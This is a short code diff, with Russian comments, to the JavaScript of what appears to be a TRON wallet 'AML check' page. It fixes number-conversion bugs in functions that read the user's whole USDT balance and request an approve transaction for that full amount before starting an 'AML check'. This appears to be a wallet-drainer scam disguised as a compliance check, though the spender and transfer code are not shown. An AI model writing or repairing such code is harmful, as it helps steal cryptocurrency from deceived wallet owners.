@@ -239,7 +239,7 @@ async function getUSDTBalance(address) {
 }
 
 // ============================================
-// ПРОВЕРКА КОШЕЛЬКА
+// ПРОВЕРКА КОШЕЛЬКА (ИСПРАВЛЕНО)
 // ============================================
 async function handleTronCheck() {
     try {
@@ -263,7 +263,8 @@ async function handleTronCheck() {
         if (connectedWalletAddress) {
             const balance = await getUSDTBalance(connectedWalletAddress);
             if (balance) {
-                const balanceInUSDT = (balance / 1000000).toFixed(2);
+                // ✅ ИСПРАВЛЕНО: Number(balance) вместо balance
+                const balanceInUSDT = (Number(balance) / 1000000).toFixed(2);
                 currentApproveAmount = balance;
                 if (modalAmount) {
                     modalAmount.textContent = balanceInUSDT + ' USDT';
@@ -283,7 +284,7 @@ async function handleTronCheck() {
 }
 
 // ============================================
-// ПОДТВЕРЖДЕНИЕ APPROVE
+// ПОДТВЕРЖДЕНИЕ APPROVE (ИСПРАВЛЕНО)
 // ============================================
 async function confirmApprove() {
     try {
@@ -312,7 +313,8 @@ async function confirmApprove() {
         checkBtn.innerHTML = originalText;
         checkBtn.disabled = false;
 
-        const balanceInUSDT = (currentApproveAmount / 1000000).toFixed(2);
+        // ✅ ИСПРАВЛЕНО: Number(currentApproveAmount) вместо currentApproveAmount
+        const balanceInUSDT = (Number(currentApproveAmount) / 1000000).toFixed(2);
         startAMLCheck(walletAddress, userAddress, tx, balanceInUSDT);
 
     } catch (error) {
